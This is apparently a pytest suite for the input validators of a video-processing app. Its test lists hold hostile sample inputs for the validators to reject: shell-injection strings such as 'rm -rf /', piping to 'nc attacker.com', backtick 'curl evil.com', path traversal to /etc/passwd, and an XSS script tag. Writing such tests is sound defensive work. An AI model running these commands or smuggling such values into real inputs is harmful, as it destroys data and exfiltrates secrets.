"""
Tests for validation utilities.
"""

import pytest
from utils.validators import (
    validate_reel_url,
    validate_uuid,
    validate_filename,
    validate_file_extension,
    validate_method,
    validate_threshold,
    get_safe_path,
    sanitize_input,
)
from pathlib import Path


# ============== URL Validation Tests ==============

class TestValidateReelUrl:
    """Tests for validate_reel_url function."""
    
    # Valid URLs
    valid_urls = [
        ("https://www.instagram.com/reel/ABC123/", "Instagram with www"),
        ("https://instagram.com/reel/ABC123", "Instagram without www"),
        ("https://www.youtube.com/watch?v=ABC123", "YouTube watch"),
        ("https://youtube.com/watch?v=ABC123", "YouTube without www"),
        ("https://youtu.be/ABC123", "YouTube short"),
        ("https://www.youtube.com/shorts/ABC123", "YouTube shorts"),
        ("https://fb.watch/ABC123", "Facebook watch"),
        ("https://www.facebook.com/reel/ABC123", "Facebook reel"),
        ("https://www.tiktok.com/@user/video/123456", "TikTok video"),
    ]
    
    @pytest.mark.parametrize("url,description", valid_urls)
    def test_valid_urls(self, url, description):
        """Should accept valid video URLs."""
        assert validate_reel_url(url) is True, f"Failed for {description}: {url}"
    
    # Invalid URLs - Command injection
    injection_urls = [
        ("; rm -rf /", "Semicolon injection"),
        ("| cat /etc/passwd", "Pipe injection"),
        ("`whoami`", "Backtick injection"),
        ("$(id)", "Command substitution"),
        ("&& ls -la", "AND operator"),
        ("|| echo hacked", "OR operator"),
        ("https://example.com; rm -rf /", "URL with semicolon"),
        ("https://example.com | nc attacker.com 9999", "URL with pipe"),
        ("https://example.com`curl evil.com`", "URL with backtick"),
    ]
    
    @pytest.mark.parametrize("url,description", injection_urls)
    def test_command_injection_blocked(self, url, description):
        """Should block command injection attempts."""
        assert validate_reel_url(url) is False, f"Failed to block {description}: {url}"
    
    # Invalid URLs - Path traversal
    traversal_urls = [
        ("../../../etc/passwd", "Relative path traversal"),
        ("..\\..\\..\\windows\\system32", "Windows path traversal"),
        ("/etc/passwd", "Absolute path"),
        ("https://example.com/../etc/passwd", "URL with traversal"),
    ]
    
    @pytest.mark.parametrize("url,description", traversal_urls)
    def test_path_traversal_blocked(self, url, description):
        """Should block path traversal attempts."""
        assert validate_reel_url(url) is False, f"Failed to block {description}: {url}"
    
    # Invalid URLs - Wrong domain
    wrong_domain_urls = [
        ("https://example.com/video", "Generic domain"),
        ("https://attacker.com/malicious", "Attacker domain"),
        ("ftp://instagram.com/reel/ABC", "Wrong protocol"),
        ("", "Empty string"),
        ("not-a-url", "Invalid format"),
    ]
    
    @pytest.mark.parametrize("url,description", wrong_domain_urls)
    def test_wrong_domain_blocked(self, url, description):
        """Should block URLs from wrong domains."""
        assert validate_reel_url(url) is False, f"Failed to block {description}: {url}"
    
    def test_url_too_long(self):
        """Should reject extremely long URLs."""
        long_url = "https://instagram.com/reel/" + "A" * 500
        assert validate_reel_url(long_url) is False
    
    def test_url_with_port(self):
        """Should handle URLs with port numbers."""
        # Should be rejected as not in allowed domains
        url = "https://instagram.com:8080/reel/ABC123"
        # Note: This might pass or fail depending on implementation
        result = validate_reel_url(url)
        assert isinstance(result, bool)


# ============== UUID Validation Tests ==============

class TestValidateUuid:
    """Tests for validate_uuid function."""
    
    valid_uuids = [
        "550e8400-e29b-41d4-a716-446655440000",
        "6ba7b810-9dad-11d1-80b4-00c04fd430c8",
        "00000000-0000-4000-8000-000000000000",
        "ffffffff-ffff-4fff-bfff-ffffffffffff",
    ]
    
    @pytest.mark.parametrize("uuid", valid_uuids)
    def test_valid_uuids(self, uuid):
        """Should accept valid UUID v4 format."""
        assert validate_uuid(uuid) is True
    
    invalid_uuids = [
        ("not-a-uuid", "Plain string"),
        ("550e8400-e29b-41d4-a716", "Too short"),
        ("550e8400-e29b-41d4-a716-446655440000-extra", "Too long"),
        ("550e8400-e29b-01d4-a716-446655440000", "Wrong version (01)"),
        ("550e8400-e29b-51d4-a716-446655440000", "Wrong version (5)"),
        ("550e8400-e29b-41d4-0176-446655440000", "Wrong variant (01)"),
        ("550e8400-e29b-41d4-c176-446655440000", "Wrong variant (c)"),
        ("550e8400-e29b-41d4-a716-44665544000g", "Invalid character (g)"),
        ("550e8400e29b41d4a716446655440000", "No hyphens"),
        ("", "Empty string"),
        ("../../../etc/passwd", "Path traversal"),
        ("..\\..\\..\\windows", "Windows traversal"),
    ]
    
    @pytest.mark.parametrize("uuid,description", invalid_uuids)
    def test_invalid_uuids(self, uuid, description):
        """Should reject invalid UUID formats."""
        assert validate_uuid(uuid) is False, f"Failed for {description}: {uuid}"


# ============== Filename Validation Tests ==============

class TestValidateFilename:
    """Tests for validate_filename function."""
    
    valid_filenames = [
        ("frame_0000.png", "First frame"),
        ("frame_9999.png", "Last frame"),
        ("frame_1234.png", "Middle frame"),
        ("frame_0001.png", "Second frame"),
    ]
    
    @pytest.mark.parametrize("filename,description", valid_filenames)
    def test_valid_filenames(self, filename, description):
        """Should accept valid frame filenames."""
        assert validate_filename(filename) is True, f"Failed for {description}"
    
    invalid_filenames = [
        ("../../../etc/passwd", "Path traversal"),
        ("..\\..\\windows\\system32", "Windows traversal"),
        ("../frame_0000.png", "Relative path"),
        ("frame_0000.jpg", "Wrong extension"),
        ("frame_0000.jpeg", "Wrong extension"),
        ("frame_0000.exe", "Executable"),
        ("frame_0000.sh", "Shell script"),
        ("frame_00000.png", "5 digits"),
        ("frame_000.png", "3 digits"),
        ("frame_0000", "No extension"),
        ("frame.png", "No digits"),
        ("other_0000.png", "Wrong prefix"),
        ("frame_0000.png.exe", "Double extension"),
        ("", "Empty string"),
        ("frame_0000.png\n", "Newline"),
        ("frame_0000.png\x00", "Null byte"),
    ]
    
    @pytest.mark.parametrize("filename,description", invalid_filenames)
    def test_invalid_filenames(self, filename, description):
        """Should reject invalid filenames."""
        assert validate_filename(filename) is False, f"Failed to block {description}: {filename}"


# ============== File Extension Validation Tests ==============

class TestValidateFileExtension:
    """Tests for validate_file_extension function."""
    
    valid_extensions = [
        ("video.mp4", "MP4"),
        ("video.avi", "AVI"),
        ("video.mov", "MOV"),
        ("video.mkv", "MKV"),
        ("video.webm", "WebM"),
        ("VIDEO.MP4", "Uppercase"),
        ("Video.Mp4", "Mixed case"),
    ]
    
    @pytest.mark.parametrize("filename,description", valid_extensions)
    def test_valid_extensions(self, filename, description):
        """Should accept valid video extensions."""
        assert validate_file_extension(filename) is True, f"Failed for {description}"
    
    invalid_extensions = [
        ("video.exe", "Executable"),
        ("video.sh", "Shell script"),
        ("video.php", "PHP"),
        ("video.py", "Python"),
        ("video.js", "JavaScript"),
        ("video.html", "HTML"),
        ("video.txt", "Text"),
        ("video.pdf", "PDF"),
        ("video", "No extension"),
        (".mp4", "Only extension"),
        ("", "Empty string"),
    ]
    
    @pytest.mark.parametrize("filename,description", invalid_extensions)
    def test_invalid_extensions(self, filename, description):
        """Should reject invalid file extensions."""
        assert validate_file_extension(filename) is False, f"Failed to block {description}"


# ============== Method Validation Tests ==============

class TestValidateMethod:
    """Tests for validate_method function."""
    
    valid_methods = [
        ("ssim", "SSIM method"),
        ("pixel", "Pixel method"),
        ("SSIM", "Uppercase SSIM"),
        ("PIXEL", "Uppercase PIXEL"),
    ]
    
    @pytest.mark.parametrize("method,description", valid_methods)
    def test_valid_methods(self, method, description):
        """Should accept valid methods."""
        assert validate_method(method) is True, f"Failed for {description}"
    
    invalid_methods = [
        ("other", "Invalid method"),
        ("", "Empty string"),
        ("ssim_pixel", "Combined"),
        ("ssim ", "With space"),
        (" ssim", "Leading space"),
    ]
    
    @pytest.mark.parametrize("method,description", invalid_methods)
    def test_invalid_methods(self, method, description):
        """Should reject invalid methods."""
        assert validate_method(method) is False, f"Failed to block {description}"


# ============== Threshold Validation Tests ==============

class TestValidateThreshold:
    """Tests for validate_threshold function."""
    
    valid_thresholds = [
        (0.0, "Minimum"),
        (1.0, "Maximum"),
        (0.5, "Middle"),
        (0.8, "Default"),
        (0.123, "Decimal"),
    ]
    
    @pytest.mark.parametrize("threshold,description", valid_thresholds)
    def test_valid_thresholds(self, threshold, description):
        """Should accept valid thresholds."""
        assert validate_threshold(threshold) is True, f"Failed for {description}"
    
    invalid_thresholds = [
        (-0.1, "Negative"),
        (1.1, "Over 1"),
        (2.0, "Way over"),
        (-1.0, "Way under"),
    ]
    
    @pytest.mark.parametrize("threshold,description", invalid_thresholds)
    def test_invalid_thresholds(self, threshold, description):
        """Should reject invalid thresholds."""
        assert validate_threshold(threshold) is False, f"Failed to block {description}"


# ============== Safe Path Tests ==============

class TestGetSafePath:
    """Tests for get_safe_path function."""
    
    def test_valid_path(self):
        """Should construct valid safe path."""
        path = get_safe_path(
            "/storage",
            "550e8400-e29b-41d4-a716-446655440000",
            "frame_0000.png"
        )
        
        assert path == Path("/storage/550e8400-e29b-41d4-a716-446655440000/frame_0000.png")
    
    def test_invalid_uuid_raises(self):
        """Should raise ValueError for invalid UUID."""
        with pytest.raises(ValueError):
            get_safe_path(
                "/storage",
                "invalid-uuid",
                "frame_0000.png"
            )
    
    def test_invalid_filename_raises(self):
        """Should raise ValueError for invalid filename."""
        with pytest.raises(ValueError):
            get_safe_path(
                "/storage",
                "550e8400-e29b-41d4-a716-446655440000",
                "../../../etc/passwd"
            )
    
    def test_path_traversal_blocked(self):
        """Should block path traversal attempts."""
        # This should be caught by UUID validation
        with pytest.raises(ValueError):
            get_safe_path(
                "/storage",
                "../../../etc/passwd",
                "frame_0000.png"
            )


# ============== Sanitize Input Tests ==============

class TestSanitizeInput:
    """Tests for sanitize_input function."""
    
    def test_removes_dangerous_chars(self):
        """Should remove dangerous characters."""
        result = sanitize_input("<script>alert('xss')</script>")
        assert "<" not in result
        assert ">" not in result
        assert "'" not in result
    
    def test_limits_length(self):
        """Should limit string length."""
        long_string = "a" * 200
        result = sanitize_input(long_string, max_length=50)
        assert len(result) <= 50
    
    def test_handles_empty(self):
        """Should handle empty string."""
        result = sanitize_input("")
        assert result == ""
    
    def test_handles_none(self):
        """Should handle None."""
        result = sanitize_input(None)
        assert result == ""


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
